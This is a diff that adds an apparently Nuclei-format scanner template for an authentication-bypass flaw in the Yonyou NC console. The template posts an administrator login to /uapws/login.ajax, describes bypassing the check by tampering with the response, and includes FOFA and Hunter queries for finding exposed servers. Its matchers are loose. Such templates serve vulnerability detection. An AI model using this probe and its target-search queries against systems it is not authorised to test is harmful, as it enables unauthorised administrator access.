@@ -1,0 +1,41 @@
+id: 用友nc 控制台绕过漏洞
+time: '2023-07-20'
+
+
+info:
+  name: 用友nc 控制台绕过漏洞
+  severity: high
+  description: 页面为用友NC控制台，用友NC控制台存在一个可通过修改返回包来绕过验证，登录administrator用户的漏洞。随意输入密码，点击OK时开启抓包
+  reference: https://mp.weixin.qq.com/s/AdbzqcXkZ4GoQUI3J6Qeyw
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: FOFA:app="用友-NC-Cloud"
+    Hunter: web.body="uap/rbac"
+  
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/uapws/login.ajax" 
+        
+    body: 
+      - |
+        {
+            "name":"administrator",
+            "password":"111111"
+        }
+        
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "0"
+          - "1"
+
+      - type: status
+        status:
+          - 200
+    
